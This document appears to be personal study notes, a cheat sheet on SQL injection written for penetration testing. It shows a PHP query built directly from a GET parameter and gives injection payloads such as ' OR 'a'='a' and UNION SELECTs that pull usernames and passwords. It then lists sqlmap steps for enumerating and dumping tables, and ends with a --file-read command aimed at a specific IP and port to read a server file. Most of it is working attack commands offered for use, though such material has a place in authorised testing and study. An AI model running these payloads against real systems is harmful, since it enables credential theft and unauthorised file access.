#### connecting to SQL

`mysql -u <username> -p<password> -h <dbms ip>`

#### SQL Connection

```bash
$dbhostname='1.2.3.4';
$dbuser='username';
$dbpassword='password';
$dbname='database';
$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";
$results = mysqli_query($connection, $query);display_results($results);
```

* * *

#### SQL Connection: Dyanmically build

```bash
$id = $_GET['id'];

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='$id';";
$results = mysqli_query($connection, $query);display_results($results);
```
* * *

#### Attacker changing the sql script

Suppose the query is `SELECT Name, Description FROM Products WHERE ID='$id';`.
<newline>
We insert `' OR 'a'='a` the query becomes `SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';` 
<newline>
We can exploit also union command by adding `' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a` to the end of the query and thus the query becomes `SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';` This will result in displaying all Username and password.
* * *
#### Steps to follow to check whether there is a vulnerability

1. Add string termination `'` and check whwther there is any odd behaviour to find possible injection point.
2. Keep in mind that during a pentest you have to find all vulnerability, so you have to test all other inputs. You will not just stop at the first injection point you find and can use Burp Proxy to test Headers, Cookies and POST parameters.
3. Add query `SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';` by adding `' OR 'a'='a` to the injection point and check the behaviour. like `' or 1=1; -- -`
4. And also check with false like `' OR '1='11`
5. `SELECT description FROM items WHERE id='' UNION SELECT user(); -- 0-';` by adding `' UNION SELECT user(); -- -` to get the user output. 
6. We can use UNION to find number of fields in the database.`' UNION SELECT null; -- -`, `' UNION SELECT null, null; -- -` see if the number of query matches. Keep adding null until the fileds match.
7. After finding number of fields add some known values to the fields. For example:
`' UNION SELECT 'id1', 'id2'; -- -`
8. Check which one is reflected also check the source code.
9. If Id1 is reflected lets exploit that by changing id1 by `' UNION SELECT user(), 'id2'; -- -`
This will show the user.
* * *

#### SQL Map
Format: `sqlmap –u <URL> -p <injection parameter> [options]`
<newline>
Example: `sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U`
<newline>
For exploiting POST parameter the synatx would be `sqlmap–u <URL> --data=<POST string> -p parameter [options]`.
<newline>

#### Steps for using SQL Map 1
1. Find the vulnerability area.
2. Go to linux terminal and type in the format `sqlmap –u <URL> -p <injection parameter> [options]`.
For example: `sqlmap -u 'http://victim.site/view.php?id=1141'`
3. The above query will help in checking the parameter is vulnerable and give details like OS, dbms etc.
4. To get banner type `sqlmap -u 'http://victim.site/view.php?id=1141' -b`.
5. For getting more structure type `sqlmap -u 'http://victim.site/view.php?id=1141' --tables` to see all tables in the dbms.
6. To see current table type `sqlmap -u 'http://victim.site/view.php?id=1141' --current-db selfie4you --columns`
7. Use `sqlmap -u 'http://victim.site/view.php?id=1141' --current-db selfie4you --dumps` to crack password or view the table.
* * *

#### Steps for using SQL Map 2
1. Find the vulnerability area.
2. Go to linux terminal and type in the format `sqlmap –u <URL> -p <injection parameter> [options]`.
For example: `sqlmap -u 'http://victim.site/view.php?id=1141'`
3. The above query will help in checking the parameter is vulnerable and give details like OS, dbms etc.
4. To get banner type `sqlmap -u 'http://victim.site/view.php?id=1141' --banner`.
5. To see the schemas `sqlmap -u 'http://victim.site/view.php?id=1141' --dbms`.
6. To select table `sqlmap -u 'http://victim.site/view.php?id=1141' -D <schema name> --tables`
7. To select column details `sqlmap -u 'http://victim.site/view.php?id=1141' -D <schema name> -T <table name> --columns`
8. To dump two column details `sqlmap -u 'http://victim.site/view.php?id=1141' -D <schema name> -T <table name> -C <column1>,<column2> --dump`
* * *

To read unauthorised file `sudo sqlmap -u '157.245.40.149:32168/portfolio.php?id=1' --file-read=/var/www/html/administrat/panel.php
`

